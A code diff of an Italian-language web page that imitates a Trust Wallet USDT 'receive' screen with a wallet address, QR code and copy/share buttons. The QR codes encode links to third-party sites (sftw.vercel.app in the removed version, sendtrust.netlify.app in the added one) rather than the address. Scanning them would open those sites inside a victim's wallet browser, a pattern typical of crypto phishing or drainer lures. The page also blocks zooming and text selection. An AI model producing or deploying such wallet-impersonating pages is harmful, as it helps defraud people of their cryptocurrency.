@@ -2,7 +2,7 @@
 <html lang="it">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
   <title>Ricevi USDT</title>
 
   <style>
@@ -10,92 +10,276 @@
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      -webkit-user-select: none;
+      user-select: none;
     }
 
     body {
-      background: #f5f5f5;
-      display: flex;
-      justify-content: center;
+      background: #ffffff;
       min-height: 100vh;
-      padding: 20px;
+      color: #1c1c1e;
     }
 
     .container {
-      width: 100%;
       max-width: 420px;
-      background: white;
+      margin: 0 auto;
       min-height: 100vh;
-      padding: 20px;
+      background: #ffffff;
     }
 
-    .title {
-      text-align: center;
-      font-size: 34px;
-      font-weight: 700;
-      margin-top: 15px;
-      margin-bottom: 20px;
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 20px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .close-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #1c1c1e;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+    }
+
+    .header-title {
+      font-size: 17px;
+      font-weight: 600;
+      color: #1c1c1e;
+    }
+
+    .info-btn {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #e5e5ea;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #8e8e93;
+      font-size: 14px;
+      font-weight: bold;
+      font-style: italic;
     }
 
     .warning {
-      background: #f9efd8;
+      background: #fff8e1;
+      margin: 16px;
+      padding: 12px 14px;
+      border-radius: 12px;
+      font-size: 13px;
+      color: #5a5a5a;
+      line-height: 1.4;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+    }
+
+    .warning-icon {
+      color: #ff9500;
+      font-size: 16px;
+      flex-shrink: 0;
+      margin-top: 1px;
+      font-weight: bold;
+    }
+
+    .token-section {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin: 20px 0 24px;
+    }
+
+    .token-logo {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #26A17B;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .token-logo svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    .token-name {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1c1c1e;
+    }
+
+    .token-badge {
+      background: #f2f2f7;
+      color: #8e8e93;
+      padding: 4px 10px;
+      border-radius: 12px;
+      font-size: 13px;
+      font-weight: 500;
+    }
+
+    .qr-card {
+      margin: 0 16px;
+      background: #ffffff;
+      border-radius: 20px;
+      padding: 24px;
+      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.08);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .qr-wrapper {
+      position: relative;
+      width: 240px;
+      height: 240px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .qr-wrapper img {
+      width: 100%;
+      height: 100%;
+      border-radius: 16px;
+    }
+
+    .qr-logo {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 52px;
+      height: 52px;
+      background: #ffffff;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.12);
+      padding: 8px;
+    }
+
+    .qr-logo svg {
+      width: 32px;
+      height: 32px;
+    }
+
+    .address {
+      margin-top: 16px;
+      font-size: 14px;
+      color: #1c1c1e;
+      text-align: center;
+      word-break: break-all;
+      font-family: "SF Mono", Monaco, monospace;
+      line-height: 1.5;
+      max-width: 260px;
+      letter-spacing: 0.5px;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: center;
+      gap: 40px;
+      margin: 28px 0;
+    }
+
+    .action-btn {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #1c1c1e;
+    }
+
+    .action-icon {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      background: #f2f2f7;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      color: #1c1c1e;
+    }
+
+    .action-label {
+      font-size: 13px;
+      font-weight: 500;
+      color: #1c1c1e;
+    }
+
+    .deposit-box {
+      margin: 0 16px 24px;
+      background: #f2f2f7;
       border-radius: 16px;
       padding: 16px;
-      font-size: 15px;
-      color: #4a4a4a;
-      margin-bottom: 20px;
-      line-height: 1.4;
+      display: flex;
+      align-items: center;
+      gap: 14px;
     }
 
-    .token {
-      text-align: center;
-      font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 20px;
-    }
-
-    .badge {
-      background: #efefef;
-      border-radius: 8px;
-      padding: 5px 10px;
-      font-size: 15px;
-      vertical-align: middle;
-    }
-
-    .card {
-      background: white;
-      border-radius: 20px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.08);
-      padding: 20px;
-      text-align: center;
-    }
-
-    .qr {
-      width: 260px;
-      height: 260px;
-      display: block;
-      margin: auto;
-    }
-
-    .desc {
-      color: #666;
-      text-align: center;
-      margin-top: 18px;
-      line-height: 1.5;
-      font-size: 16px;
-    }
-
-    .btn {
-      width: 100%;
-      border: none;
-      background: #3375ff;
-      color: white;
-      padding: 18px;
-      border-radius: 18px;
+    .deposit-icon {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: #e8e8ed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #007aff;
       font-size: 18px;
-      font-weight: 700;
-      margin-top: 28px;
-      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .deposit-text {
+      flex: 1;
+    }
+
+    .deposit-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1c1c1e;
+      margin-bottom: 2px;
+    }
+
+    .deposit-subtitle {
+      font-size: 13px;
+      color: #8e8e93;
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 40px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: #1c1c1e;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 24px;
+      font-size: 14px;
+      opacity: 0;
+      transition: all 0.3s ease;
+      z-index: 1000;
+    }
+
+    .toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
     }
   </style>
 </head>
@@ -103,49 +287,159 @@
 
   <div class="container">
 
-    <div class="title">
-      Ricevi
+    <div class="header">
+      <button class="close-btn" onclick="goBack()">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="18" y1="6" x2="6" y2="18"></line>
+          <line x1="6" y1="6" x2="18" y2="18"></line>
+        </svg>
+      </button>
+      <div class="header-title">Ricevi</div>
+      <button class="info-btn">i</button>
     </div>
 
     <div class="warning">
-      Invia solo USDT (ERC20) a questo indirizzo.
-      Gli altri asset potrebbero andare persi.
+      <span class="warning-icon">ⓘ</span>
+      <span>Invia solo asset Tether USD (ERC20) a questo indirizzo. Asset diversi andranno persi per sempre.</span>
     </div>
 
-    <div class="token">
-      USDT <span class="badge">Ethereum</span>
+    <div class="token-section">
+      <div class="token-logo">
+        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="16" cy="16" r="16" fill="#26A17B"/>
+          <path d="M17.922 17.078v-.002c-.02.001-.126.008-.362.008-.236 0-.404-.007-.432-.008v.003c-3.349-.148-5.851-.736-5.851-1.443 0-.707 2.502-1.295 5.851-1.443v2.302c.028.001.193.009.436.009.272 0 .354-.008.358-.008v-2.303c3.343.148 5.839.737 5.839 1.443s-2.496 1.294-5.839 1.442zm0-3.149v-2.055h4.916V8.77H9.078v3.104h4.916v2.055c-3.803.175-6.656.924-6.656 1.823 0 .899 2.853 1.648 6.656 1.823v6.546h3.928v-6.547c3.799-.175 6.648-.924 6.648-1.822 0-.898-2.849-1.647-6.648-1.822z" fill="white"/>
+        </svg>
+      </div>
+      <div class="token-name">USDT</div>
+      <div class="token-badge">Ethereum</div>
     </div>
 
-    <div class="card">
-
-      <img
-        class="qr"
-       <img
-  class="qr"
-  src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://link.trustwallet.com/open_url?url=https://sftw.vercel.app/"
-/>
-      />
-
+    <div class="qr-card">
+      <div class="qr-wrapper">
+        <img
+          id="qrCode"
+          src=""
+          alt="QR Code"
+        />
+        <div class="qr-logo">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2L4 6v6c0 5.5 3.4 10.7 8 12 4.6-1.3 8-6.5 8-12V6l-8-4z" fill="#1c1c1e"/>
+            <path d="M12 6l-4 2v4c0 3 1.8 5.8 4 6.5 2.2-.7 4-3.5 4-6.5V8l-4-2z" fill="#ffffff" opacity="0.25"/>
+          </svg>
+        </div>
+      </div>
+      <div class="address" id="walletAddress">0x266312745F3AEf891F2048945cD5bde2881D7AB1</div>
     </div>
 
-    <div class="desc">
-      Scansiona il QR code con Trust Wallet per aprire il sito.
+    <div class="actions">
+      <button class="action-btn" onclick="copyAddress()">
+        <div class="action-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+            <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path>
+          </svg>
+        </div>
+        <span class="action-label">Copia</span>
+      </button>
+
+      <button class="action-btn" onclick="setAmount()">
+        <div class="action-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"></path>
+            <polyline points="7 10 12 15 17 10"></polyline>
+            <line x1="12" y1="15" x2="12" y2="3"></line>
+          </svg>
+        </div>
+        <span class="action-label">Imposta importo</span>
+      </button>
+
+      <button class="action-btn" onclick="shareAddress()">
+        <div class="action-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4 12v8a2 2 0 002 2h12a2 2 0 002-2v-8"></path>
+            <polyline points="16 6 12 2 8 6"></polyline>
+            <line x1="12" y1="2" x2="12" y2="15"></line>
+          </svg>
+        </div>
+        <span class="action-label">Condividi</span>
+      </button>
     </div>
 
-    <button class="btn" onclick="closePage()">
-      Continua
-    </button>
+    <div class="deposit-box">
+      <div class="deposit-icon">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="12" y1="5" x2="12" y2="19"></line>
+          <polyline points="19 12 12 19 5 12"></polyline>
+        </svg>
+      </div>
+      <div class="deposit-text">
+        <div class="deposit-title">Deposita dall'exchange</div>
+        <div class="deposit-subtitle">Tramite bonifico diretto dal tuo conto</div>
+      </div>
+    </div>
 
   </div>
 
-  <script>
-    function closePage() {
-      window.close();
+  <div class="toast" id="toast">Indirizzo copiato</div>
 
-      setTimeout(() => {
-        history.back();
-      }, 200);
+  <script>
+    const WALLET_ADDRESS = "0x266312745F3AEf891F2048945cD5bde2881D7AB1";
+
+    function showToast(msg) {
+      const toast = document.getElementById("toast");
+      toast.textContent = msg;
+      toast.classList.add("show");
+      setTimeout(() => toast.classList.remove("show"), 2000);
     }
+
+    function copyAddress() {
+      navigator.clipboard.writeText(WALLET_ADDRESS).then(() => {
+        showToast("Indirizzo copiato");
+      }).catch(() => {
+        const ta = document.createElement("textarea");
+        ta.value = WALLET_ADDRESS;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand("copy");
+        document.body.removeChild(ta);
+        showToast("Indirizzo copiato");
+      });
+    }
+
+    function setAmount() {
+      const amount = prompt("Inserisci l'importo in USDT:");
+      if (amount && !isNaN(amount)) {
+        const newUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://sendtrust.netlify.app/receive.html?address=${WALLET_ADDRESS}&amount=${amount}`;
+        document.getElementById("qrCode").src = newUrl;
+        showToast(`Importo impostato: ${amount} USDT`);
+      }
+    }
+
+    function shareAddress() {
+      if (navigator.share) {
+        navigator.share({
+          title: "Il mio indirizzo USDT",
+          text: `Invia USDT (ERC20) a: ${WALLET_ADDRESS}`,
+          url: window.location.href
+        });
+      } else {
+        copyAddress();
+      }
+    }
+
+    function goBack() {
+      if (window.history.length > 1) {
+        history.back();
+      } else {
+        window.close();
+      }
+    }
+
+    // Genera QR code all'avvio
+    window.addEventListener("load", () => {
+      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://sendtrust.netlify.app/receive.html?address=${WALLET_ADDRESS}`;
+      document.getElementById("qrCode").src = qrUrl;
+    });
   </script>
 
 </body>
